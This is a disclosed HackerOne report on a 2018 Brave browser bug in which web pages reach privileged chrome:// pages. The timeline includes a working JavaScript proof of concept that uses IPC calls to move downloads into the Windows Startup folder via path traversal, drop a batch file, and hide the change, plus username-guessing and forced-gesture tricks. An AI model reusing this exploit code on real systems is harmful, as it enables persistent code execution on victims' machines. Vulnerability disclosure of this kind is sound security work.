---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - impact/rce
  - trigger/one-click
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2018-10-23
submitted: 2018-09-28T22:10:33.055Z
bounty_usd: null
votes: 21
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "qab"
source: "https://hackerone.com/reports/415967"
title: "chrome://brave navigation from web"
---
# chrome://brave navigation from web

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 21 | **Program:** Brave Software | **Disclosed:** 2018-10-23

- Report: [https://hackerone.com/reports/415967](https://hackerone.com/reports/415967)
- CWE: Code Injection
- Submitted: 2018-09-28T22:10:33.055Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

It's possible to navigate to the infamous 'chrome://brave' (and all other) privileged page from web, requiring only a single click. This is possible by opening popups with the 'noopener' attribute.

## Products affected: 

 
Brave: 0.24.0 
V8: 6.9.427.23 
rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c 
Muon: 8.1.6 
OS Release: 10.0.17134 
Update Channel: Release 
OS Architecture: x64 
OS Platform: Microsoft Windows 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 69.0.3497.100

## Steps To Reproduce:

1. Host attached PoC from web
2. Click button

## Impact

This is a direct violation of SOP, we can open any URL of which chrome://brave is the worst as it could lead to RCE.

## Timeline

- **Report Filed**
- **2018-09-29** @qab: Alright so I came up with a pretty good new PoC. 

I am chaining the bugs I found, first is the local file detection for fuzzing OS username so we can predict our dropped html file ( https://hackerone.com/reports/415167 ) and the Windows RCE chrome code described in ( https://hackerone.com/reports/415178 ).

I am dropping an HTML file by having the user hold down 'enter' and then suddenly pop a 'saveas' download prompt, then i immediately open the chrome:brave location (since keyboard keys count as a valid user gesture worthy of a popup) and then boom, RCE from web!

STR: (Windows only)

1. Host attached PoC on web
2. Wait for it to guess your OS username (I put a smallish list of names, please just put yours somewhere in the array if its not in it)
3. Once its done, hold down 'enter'
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Triaged**
- **2018-10-02** @qab: We can still perform RCE after that patch, using IPC:
1. We disable the 'saveAs' prompt for downloads
2. Using a path traversal bug(?) we set the default downloads to the startup folder
3. Initiate download of an executable that will be dropped to the startup folder
4. Clear all completed downloads
5. Reset downloads path to the default 'Downloads' folder and return the 'saveAs' prompt, to makes things look normal as not to alert victim.

When the user restarts, the executable is automatically executed. Interestingly, windows ignores Mark of the web when executing from startup folder on startup.

The following is the code which can be used in the RCE exploit instead (@line 48, change the base64 into the based64 of the code below)
```<a href="data:,calc" download="q.bat" id="qfile"></a>
<script>
chrome.ipcRenderer.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.download-always-ask","value":false}');
chrome.ipcRenderer.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.download-default-path","value":"./../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup"}');
qfile.click()
setTimeout(`chrome.ipcRenderer.send("dispatch-action",'{"actionType":"app-clear-completed-downloads"}');`,333);
setTimeout(`chrome.ipcRenderer.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.download-default-path","value":"./../../../../Downloads/"}');`,666);
setTimeout(`chrome.ipcRenderer.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.download-always-ask","value":true}');`,999);
</script>```
- **Bounty Awarded**
- **2018-10-04** @qab: This seems too low to me compared to other reports, I hope I can get a clarification in my points below @brave. 
 
The report at ( https://hackerone.com/reports/395737 ) awarded $1,000 for an attack relying on MITM. And as I understand, MITM requires physical proximity to a victim or having the victim use a specific proxy all of which are much unlikely scenarios than guessing a single name and holding down enter.
$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you. So this file can still be found and used in conjuncture with my bug found here to result in the same flow of exploit. I have found some such HTML files on windows but they do not come by default pre-built with windows.

in bug #375329, $400 was awarded for a local file reading bug that required the user to download and open an html file locally. Now, I can change the exploit here to do exactly that. All you have to do is download my PoC and open it locally and then I can execute chrome code after the user clicks anywhere or presses any keyboard button. So the difference of $100 between reading local files and RCE seems a bit too low for practically the same STR.

Finally, I would like to leave you with this relevant video: https://www.youtube.com/watch?v=meiU6TxysCg
- **2018-10-04** @diracdeltas: "$750 was awarded as a bonus for pointing out that there is a system html file that can be used to trigger reflected XSS, assuming this file is not under the control of Brave then its not fixed by you." < that's not actually why we gave the 750 bonus. We realized in light of other recent reports that we had severely underpaid (250) for an exploit that was RCE from the web with very little user interaction. The system HTML file issue he pointed out didn't have an impact on this decision.

You have a good point that this is similar in complexity to #375329 but has more impact.
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
